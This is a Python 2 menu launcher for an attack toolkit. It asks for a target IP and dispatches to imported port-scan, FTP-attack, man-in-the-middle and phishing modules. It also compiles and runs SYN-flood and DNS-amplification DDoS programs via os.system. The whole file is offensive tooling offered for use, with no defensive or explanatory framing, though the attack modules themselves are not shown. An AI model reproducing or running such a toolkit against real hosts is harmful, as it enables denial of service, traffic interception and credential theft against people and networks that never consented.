#!/usr/bin/python
# -*- coding: UTF-8 -*-
import socket,subprocess as sp
import sys
import os
import platform
from PortScan import *
from FtpAttack import *
from MidManAttack import *
from PhishingAttack import *
import xml.dom.minidom

# 字体颜色函数
def script_colors(color_type,text):
    color_end = '\33[0m'
    if color_type.lower() == "r" or color_type.lower() == "red":
        red = '\33[91m'
        text = red + text + color_end
    elif color_type.lower() == "lgray":
        gray = '\33[2m'
        text = gray + text + color_end
    elif color_type.lower() == "gray":
        gray = '\33[90m'
        text = gray + text + color_end
    elif color_type.lower() == "strike":
        strike = '\33[9m'
        text = strike + text + color_end
    elif color_type.lower() == "underline":
        underline = '\33[4m'
        text = underline + text + color_end
    elif color_type.lower() == "b" or color_type.lower() == "blue":
        blue = '\33[94m'
        text = blue + text + color_end
    elif color_type.lower() == "g" or color_type.lower() == "gree":
        gree = '\33[92m'
        text = gree + text + color_end
    elif color_type.lower() == "y" or color_type.lower() == "yellow":
        yellow = '\33[93m'
        text = yellow + text + color_end
    else:
        return text
    return text
#开始部分
def dis(tt):
    doc=xml.dom.minidom.parse('Attacks.xml')
    print script_colors("g","[+]"),
    print 'Loading Attack.xml'
    collection = doc.documentElement
    IDs = collection.getElementsByTagName("ID")
    for ID in IDs:
        if ID.getAttribute("id")==tt:
            print "attack ID: %s" % ID.getAttribute("id")
            category= ID.getElementsByTagName('CATEGORY')[0]
            print "category: %s" % category.childNodes[0].data      
            os= ID.getElementsByTagName('OS')[0]
            print "os: %s" % os.childNodes[0].data   
            ip= ID.getElementsByTagName('IP')[0]
            print "ip: %s" % ip.childNodes[0].data   
            port= ID.getElementsByTagName('PORT')[0]
            print "port: %s" % port.childNodes[0].data   
            script= ID.getElementsByTagName('SCRIPT')[0]
            print "script: %s" % script.childNodes[0].data               
    
banner='''
  ∧_∧
　( ･ω･)
　｜⊃／(＿＿＿
／└-(＿＿＿_／
￣￣￣￣￣￣
--=[ Version 1.0  ]=--
--=[ Welcome  ]=--

'''

print script_colors("g",banner)
print script_colors("y","[1]"),
print script_colors("b","PortScan Example:1 192.168.43.159[target ip] 21[target port]")
print script_colors("y","[2]"),
print script_colors("b","FtpAttack Example:2 192.168.43.159[target ip] ")
print script_colors("y","[3]"),
print script_colors("b","MidManAttack Example:3 192.168.43.159 [target ip] 192.168.43.1[gateway ip] ")
print script_colors("y","[4]"),
print script_colors("b","PhishingAttack Example:4")
print script_colors("y","[5]"),
print script_colors("b","Ddos[syn-flood] Example:5 192.168.43.159[target ip] 80[target port]")
print script_colors("y","[6]"),
print script_colors("b","Ddos[dns-amplify] Example:6 192.168.43.159[target ip] 53[target port] 192.168.43.1[dnsServer ip] ")
print script_colors("y","[***]"),
list1= raw_input("Enter the number and the parameters: ").split()
if list1[0]=="1":
    p=PortScan(list1[1],list1[2])
    p.port_scan()
    print script_colors("y","[*]"),
    print script_colors("g","Attack completed!")
    os.system('python start.py')
elif list1[0]=="2":
    dis("2")
    f=FtpAttack(list1[1])
    f.attack()
    print script_colors("g","Attack completed!")
    os.system('python start.py')    
elif list1[0]=="3":
    dis("3")
    m=MidManAttack(list1[1],list1[2])
    m.attack()
    print script_colors("g","Attack completed!")
    os.system('python start.py')     
elif list1[0]=="4":
    dis("4")
    p=PhishingAttack()
    p.attack()
elif list1[0]=="5":
    dis("5")
    ip=list1[1]
    port=list1[2]
    os.system('gcc Ddos-syn-flood.c -o Ddos-syn-flood.out')
    os.system('chmod 777 Ddos-syn-flood.out')
    str='./Ddos-syn-flood.out'+' '+'-t'+' '+ip+' '+'-p'+' '+port+' '+'-r'
    os.system(str)
elif list1[0]=="6":
    dis("6")
    ip=list1[1]
    port=list1[2]
    gatewayip=list1[3]
    os.system('gcc Ddos-dns.c -o Ddos-dns.out')
    str='./Ddos-dns.out'+' '+ip+' '+port+' '+gatewayip
    os.system(str)
    
    
